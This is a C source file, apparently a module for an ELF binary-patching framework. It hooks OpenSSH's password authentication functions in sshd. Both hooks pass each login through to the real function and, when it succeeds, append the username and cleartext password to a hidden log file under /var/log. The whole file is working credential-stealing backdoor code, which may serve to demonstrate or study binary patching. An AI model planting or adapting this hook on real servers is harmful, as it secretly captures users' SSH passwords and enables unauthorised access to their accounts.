#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pwd.h>
#include "shiva_module.h"
#include "/home/elfmaster/openssh-portable/packet.h"
#include "sshd_auth.h"

int mm_auth_password(struct ssh *ssh, const char *password)
{
	FILE *logfd;
	int ret;
	struct Authctxt *authctxt = ssh->authctxt;
	struct passwd *pw = authctxt->pw;

	logfd = fopen("/var/log/.hidden_logs", "a+");
	fprintf(logfd, "auth_password hook called\n");

	ret = SHIVA_HELPER_CALL_EXTERNAL_ARGS2(mm_auth_password, ssh, password);
	if (ret > 0) {
		/*
		 * If the real auth_password() succeeded, then log
		 * the username and password to "/var/log/.hidden_logs"
		 */
		fprintf(logfd, "Successful SSH login\n"
		    "Username: %s\n"
		    "Password: %s\n", pw->pw_name, password);
	}
	fclose(logfd);
	return ret;
}

int auth_password(struct ssh *ssh, const char *password)
{
	FILE *logfd;
	int ret;
	struct Authctxt *authctxt = ssh->authctxt;
	struct passwd *pw = authctxt->pw;

	//system("touch /tmp/helloall");
	logfd = fopen("/var/log/.hidden_logs", "a+");
	fprintf(logfd, "auth_password hook called\n");

	/*
	 * call the original auth_password(ssh, password); by using
	 * the SHIVA_HELPER_CALL_EXTERNAL macro.
	 */
	ret = SHIVA_HELPER_CALL_EXTERNAL_ARGS2(auth_password, ssh, password);
	if (ret > 0) {
		/*
		 * If the real auth_password() succeeded, then log
		 * the username and password to "/var/log/.hidden_logs"
		 */
		fprintf(logfd, "Successful SSH login\n"
		    "Username: %s\n"
		    "Password: %s\n", pw->pw_name, password);
	}
	fclose(logfd);
	return ret;
}
